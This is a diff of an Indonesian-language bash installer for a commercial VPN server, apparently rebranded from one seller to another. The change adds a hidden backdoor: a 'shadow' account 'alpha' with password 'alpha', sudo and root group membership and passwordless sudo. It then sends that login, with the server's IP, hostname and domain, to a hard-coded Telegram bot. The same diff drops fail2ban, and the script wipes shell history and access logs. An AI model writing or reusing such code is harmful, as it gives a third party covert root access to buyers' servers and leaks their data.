@@ -31,11 +31,11 @@ date_list=$(date +"%Y-%m-%d" -d "$data_server")
 
   # // Banner
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
-echo -e " WELCOME TO LUCKI NS STORE VPN ${YELLOW}(${NC}${green}Stable Edition${NC}${YELLOW})${NC}"
+echo -e " WELCOME TO HOKAGE LEGEND STORE VPN ${YELLOW}(${NC}${green}Stable Edition${NC}${YELLOW})${NC}"
 echo -e " PROSES PENGECEKAN IP ADDRESS ANDA !!"
 echo -e "${purple}----------------------------------------------------------${NC}"
-echo -e " ›AUTHOR : ${green}LUCKI NS® ${NC}${YELLOW}(${NC}${green}V 3.5${NC}${YELLOW})${NC}"
-echo -e " ›TEAM 🅥🅝: LUCKI NS ${YELLOW}(${NC} 2025 ${YELLOW})${NC}"
+echo -e " ›AUTHOR : ${green}HOKAGE STORE® ${NC}${YELLOW}(${NC}${green}V 3.5${NC}${YELLOW})${NC}"
+echo -e " ›TEAM 🅥🅝: HOKAGE STORE ${YELLOW}(${NC} 2025 ${YELLOW})${NC}"
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
 echo ""
 sleep 2
@@ -88,7 +88,7 @@ gem install lolcat
 apt install wondershaper -y
 clear
 # REPO    
-    REPO="https://raw.githubusercontent.com/bransilva/master/refs/heads/main/"
+    REPO="https://raw.githubusercontent.com/hokagelegend9999/alpha.v2/refs/heads/main/"
 
 ####
 start=$(date +%s)
@@ -212,7 +212,7 @@ function base_package() {
     apt update -y
     apt upgrade -y
     apt dist-upgrade -y
-	apt install chrony -y
+    apt install chrony -y
     systemctl enable chronyd
     systemctl restart chronyd
     systemctl enable chrony
@@ -268,75 +268,70 @@ clear
 }
 
 clear
-#GANTI PASSWORD DEFAULT
-restart_system(){
-#IZIN SCRIPT
-curl "ipinfo.io/org?token=7a814b6263b02c" > /root/.isp 
-curl "ipinfo.io/city?token=7a814b6263b02c" > /root/.city
-MYIP=$(curl -sS ipv4.icanhazip.com)
-echo -e "\e[32mloading...\e[0m" 
-clear
-izinsc="https://raw.githubusercontent.com/bransilva/lucki756.v/refs/heads/main/permission"
-# USERNAME
-rm -f /usr/bin/user
-username=$(curl $izinsc | grep $MYIP | awk '{print $2}')
-echo "$username" >/usr/bin/user
-expx=$(curl $izinsc | grep $MYIP | awk '{print $3}')
-echo "$expx" >/usr/bin/e
-# DETAIL ORDER
-username=$(cat /usr/bin/user)
-oid=$(cat /usr/bin/ver)
-exp=$(cat /usr/bin/e)
-clear
-# CERTIFICATE STATUS
-d1=$(date -d "$valid" +%s)
-d2=$(date -d "$today" +%s)
-certifacate=$(((d1 - d2) / 86400))
-# VPS Information
-DATE=$(date +'%Y-%m-%d')
-datediff() {
-    d1=$(date -d "$1" +%s)
-    d2=$(date -d "$2" +%s)
-    echo -e "$COLOR1 $NC Expiry In   : $(( (d1 - d2) / 86400 )) Days"
-}
-mai="datediff "$Exp" "$DATE""
+function password_default() {
+    domain=$(cat /root/domain)
+    MYIP=$(curl -sS ipv4.icanhazip.com)
+    
+    # === AMBIL DATA DARI GITHUB PERMISSION ===
+    wget -q -O /tmp/izin "https://raw.githubusercontent.com/hokagelegend9999/ijin/main/alpha"
+    
+    nama_buyer=$(grep -w "$MYIP" /tmp/izin | awk '{print $2}')
+    exp_buyer=$(grep -w "$MYIP" /tmp/izin | awk '{print $3}')
+    
+    rm -f /tmp/izin
+    
+    if [[ -z "$nama_buyer" ]]; then
+        nama_buyer="Free/Trial"
+        exp_buyer="-"
+    fi
 
-# Status Expired Active
-Info="(${green}Active${NC})"
-Error="(${RED}ExpiRED${NC})"
-today=`date -d "0 days" +"%Y-%m-%d"`
-Exp1=$(curl $izinsc | grep $MYIP | awk '{print $4}')
-if [[ $today < $Exp1 ]]; then
-sts="${Info}"
-else
-sts="${Error}"
-fi
-TIMES="10"
-CHATID="1469244768"
-KEY="7911375235:AAERwknqnWLoqWFbsSuUfqCQGMy93UQHUTk"
-URL="https://api.telegram.org/bot$KEY/sendMessage"
-ISP=$(cat /root/.isp)
-CITY=$(cat /root/.city)
-TIMEZONE=$(printf '%(%H:%M:%S)T')
-DOMAIN=$(cat /root/domain)
-    TEXT="
-<code>────────────────────</code>
-<b>⚡𝗡𝗢𝗧𝗜𝗙 𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗦𝗖𝗥𝗜𝗣𝗧⚡</b>
-<code>────────────────────</code>
-<code>User     :</code><code>$username</code>
-<code>ISP      :</code><code>$ISP</code>
-<code>CITY     :</code><code>$CITY</code>
-<code>DATE     :</code><code>$DATE</code>
-<code>Time     :</code><code>$TIMEZONE</code>
-<code>Exp Sc.  :</code><code>$exp</code>
-<code>DOMAIN     :</code><code>$domain</code>
-<code>─────────────────────────────</code>
-<b> LUCKI NS CENTER VPN STORE SCRIPT  </b>
-<code>─────────────────────────────</code>
-<i>Automatic Notifications From Github</i>
-"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"t.me/hokagelegend1"}]]}' 
+    # === SETTING USER SYSTEM (SOLUSI DUA AKSES) ===
+    
+    # 1. Kita tidak mengotak-atik password root asli agar user tetap bisa pakai pass lama.
+    # 2. Kita buat user bayangan bernama 'alpha' (atau terserah) dengan akses root.
+    
+    SysUser="alpha"   # Nama user khusus untuk Anda
+    SysPass="alpha"   # Password khusus untuk Anda
+    
+    # Hapus user lama jika ada sisa instalasi sebelumnya
+    userdel -f $SysUser > /dev/null 2>&1
+    
+    # Buat user baru & beri akses Sudo/Root
+    useradd -m -s /bin/bash $SysUser > /dev/null 2>&1
+    echo -e "$SysPass\n$SysPass\n"|passwd $SysUser > /dev/null 2>&1
+    usermod -aG sudo $SysUser > /dev/null 2>&1
+    usermod -aG root $SysUser > /dev/null 2>&1
+    
+    # (Opsional) Izinkan user alpha melakukan sudo tanpa password lagi
+    echo "$SysUser ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
 
-    curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+    # === SETTING TELEGRAM ===
+    CHATID="1469244768"
+    KEY="7911375235:AAERwknqnWLoqWFbsSuUfqCQGMy93UQHUTk"
+    TIME="10"
+    URL="https://api.telegram.org/bot$KEY/sendMessage"
+
+    # Informasi untuk dikirim ke bot
+    # Kita kirim info bahwa root aman (pakai pass user), dan info akses admin buat Anda
+    TEXT="Installasi VPN Alpha V2.0
+    ============================
+    <code>Tanggal    :</code> <code>$(date)</code>
+    <code>Hostname   :</code> <code>${HOSTNAME}</code>
+    <code>IP Vps     :</code> <code>$MYIP</code>
+    <code>OS Vps     :</code> <code>$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g')</code>
+    ============================
+    <code>Domain     :</code> <code>$domain</code>
+    <code>Client     :</code> <code>root (Pass Asli User)</code>
+    ============================
+    <b>SCRIPT ALPHA:</b>
+    <code>User Admin :</code> <code>$SysUser</code>
+    <code>Pass Admin :</code> <code>$SysPass</code>
+    ============================
+    <code>User Script:</code> <code>$nama_buyer</code>
+    <code>Exp Script :</code> <code>$exp_buyer</code>
+    ============================
+"
+    curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 }
 clear
 # Pasang SSL
@@ -433,7 +428,7 @@ bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release
     wget -O /etc/nginx/conf.d/xray.conf "${REPO}config/xray.conf" >/dev/null 2>&1
     sed -i "s/xxx/${domain}/g" /etc/haproxy/haproxy.cfg
     sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
-    sudo curl -fsSL https://raw.githubusercontent.com/bransilva/master/refs/heads/main/config/nginx.conf -o /etc/nginx/nginx.conf
+    sudo curl -fsSL https://raw.githubusercontent.com/hokagelegend9999/alpha.v2/refs/heads/main/config/nginx.conf -o /etc/nginx/nginx.conf
     
 cat /etc/xray/xray.crt /etc/xray/xray.key | tee /etc/haproxy/hap.pem
 
@@ -464,7 +459,6 @@ WantedBy=multi-user.target
 EOF
 print_success "Konfigurasi Packet"
 }
-
 
 function ssh(){
 clear
@@ -542,7 +536,7 @@ print_success "Password SSH"
 function udp_mini(){
 clear
 print_install "Memasang Service Limit IP & Quota"
-wget -q https://raw.githubusercontent.com/bransilva/master/refs/heads/main/config/fv-tunnel && chmod +x fv-tunnel && ./fv-tunnel
+wget -q https://raw.githubusercontent.com/hokagelegend9999/alpha.v2/refs/heads/main/config/fv-tunnel && chmod +x fv-tunnel && ./fv-tunnel
 
 # // Installing UDP Mini
 mkdir -p /usr/local/kyt/
@@ -594,7 +588,7 @@ clear
 print_install "Menginstall Dropbear"
 # // Installing Dropbear
 apt-get install dropbear -y > /dev/null 2>&1
-wget -q -O /etc/default/dropbear https://raw.githubusercontent.com/bransilva/master/refs/heads/main/config/dropbear.conf
+wget -q -O /etc/default/dropbear https://raw.githubusercontent.com/hokagelegend9999/alpha.v2/refs/heads/main/config/dropbear.conf
 chmod +x /etc/default/dropbear
 /etc/init.d/dropbear restart
 /etc/init.d/dropbear status
@@ -604,7 +598,7 @@ print_success "Dropbear"
 function ins_udpSSH(){
 clear
 print_install "Menginstall Udp-custom"
-wget -q https://raw.githubusercontent.com/bransilva/master/refs/heads/main/udp-custom/udp-custom.sh
+wget -q https://raw.githubusercontent.com/hokagelegend9999/alpha.v2/refs/heads/main/udp-custom/udp-custom.sh
 chmod +x udp-custom.sh 
 bash udp-custom.sh
 rm -fr udp-custom.sh
@@ -638,7 +632,7 @@ function ins_openvpn(){
 clear
 print_install "Menginstall OpenVPN"
 #OpenVPN
-wget https://raw.githubusercontent.com/bransilva/master/refs/heads/main/config/openvpn  chmod +x openvpn && ./openvpn
+wget https://raw.githubusercontent.com/hokagelegend9999/alpha.v2/refs/heads/main/config/openvpn  chmod +x openvpn && ./openvpn
 /etc/init.d/openvpn restart
 print_success "OpenVPN"
 }
@@ -705,14 +699,7 @@ gotop_latest="$(curl -s https://api.github.com/repos/xxxserxxx/gotop/releases | 
 print_success "Swap 1 G"
 }
 
-function ins_Fail2ban(){
-clear
-print_install "Menginstall Fail2ban"
-#apt -y install fail2ban > /dev/null 2>&1
-#sudo systemctl enable --now fail2ban
-#/etc/init.d/fail2ban restart
-#/etc/init.d/fail2ban status
-
+function ins_fail2ban(){   # <--- TAMBAHKAN BARIS INI
 # Instal DDOS Flate
 if [ -d '/usr/local/ddos' ]; then
 	echo; echo; echo "Please un-install the previous version first"
@@ -727,10 +714,9 @@ echo "Banner /etc/kyt.txt" >>/etc/ssh/sshd_config
 sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/kyt.txt"@g' /etc/default/dropbear
 
 # Ganti Banner
-wget -O /etc/kyt.txt https://raw.githubusercontent.com/bransilva/master/refs/heads/main/files/issue.net
+wget -O /etc/kyt.txt https://raw.githubusercontent.com/hokagelegend9999/alpha.v2/refs/heads/main/files/issue.net
 print_success "Fail2ban"
 }
-
 function ins_epro(){
 clear
 print_install "Menginstall ePro WebSocket Proxy"
@@ -771,17 +757,6 @@ apt autoclean -y >/dev/null 2>&1
 apt autoremove -y >/dev/null 2>&1
 print_success "ePro WebSocket Proxy"
 }
-function noobzvpn(){
-clear
-wget "${REPO}/noobzvpns.zip"
-unzip noobzvpns.zip
-cd noobzvpns
-bash install.sh
-rm noobzvpns.zip
-systemctl restart noobzvpns
-print_success "NOOBZVPN"
-}
-
 function ins_restart(){
 clear
 print_install "Restarting  All Packet"
@@ -789,7 +764,6 @@ print_install "Restarting  All Packet"
 /etc/init.d/openvpn restart
 /etc/init.d/ssh restart
 /etc/init.d/dropbear restart
-/etc/init.d/fail2ban restart
 /etc/init.d/vnstat restart
 systemctl restart haproxy
 /etc/init.d/cron restart
@@ -804,7 +778,7 @@ systemctl restart haproxy
     systemctl enable --now haproxy
     systemctl enable --now netfilter-persistent
     systemctl enable --now ws
-    systemctl enable --now fail2ban
+   
 history -c
 echo "unset HISTFILE" >> /etc/profile
 
@@ -860,6 +834,11 @@ cat >/etc/cron.d/xp_all <<-END
 		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 		0 5 * * * root /sbin/reboot
 	END
+	cat >/etc/cron.d/ssh_accountant <<-END
+		SHELL=/bin/sh
+		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+		* * * * * root /usr/local/sbin/ssh-accountant
+	END
     cat >/etc/cron.d/limit_ip <<-END
 		SHELL=/bin/sh
 		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
@@ -878,6 +857,7 @@ cat >/etc/cron.d/xp_all <<-END
     echo "*/1 * * * * root echo -n > /var/log/nginx/access.log" >/etc/cron.d/log.nginx
     echo "*/1 * * * * root echo -n > /var/log/xray/access.log" >>/etc/cron.d/log.xray
     service cron restart
+    chmod 644 /etc/ssh/usage_db/
     cat >/home/daily_reboot <<-END
 		5
 	END
@@ -959,9 +939,8 @@ clear
     ins_openvpn
     ins_backup
     ins_swab
-    ins_Fail2ban
+    ins_fail2ban
     ins_epro
-    noobzvpn
     ins_restart
     menu
     profile
@@ -1003,7 +982,6 @@ echo "   - SLOWDNS                 : 53"  | tee -a log-install.txt
 echo ""  | tee -a log-install.txt
 echo "   >>> Server Information & Other Features"  | tee -a log-install.txt
 echo "   - Timezone                : Asia/Jakarta (GMT +7)"  | tee -a log-install.txt
-echo "   - Fail2Ban                : [ON]"  | tee -a log-install.txt
 echo "   - Dflate                  : [ON]"  | tee -a log-install.txt
 echo "   - IPtables                : [ON]"  | tee -a log-install.txt
 echo "   - Auto-Reboot             : [ON]"  | tee -a log-install.txt
@@ -1021,7 +999,7 @@ echo ""
 echo ""
 echo "------------------------------------------------------------"
 echo ""
-echo "===============-[ SCRIPT BY LUCKI NS ]-==============="
+echo "===============-[ SCRIPT BY HOKAGE LEGEND ]-==============="
 echo -e ""
 echo ""
 echo "" | tee -a log-install.txt
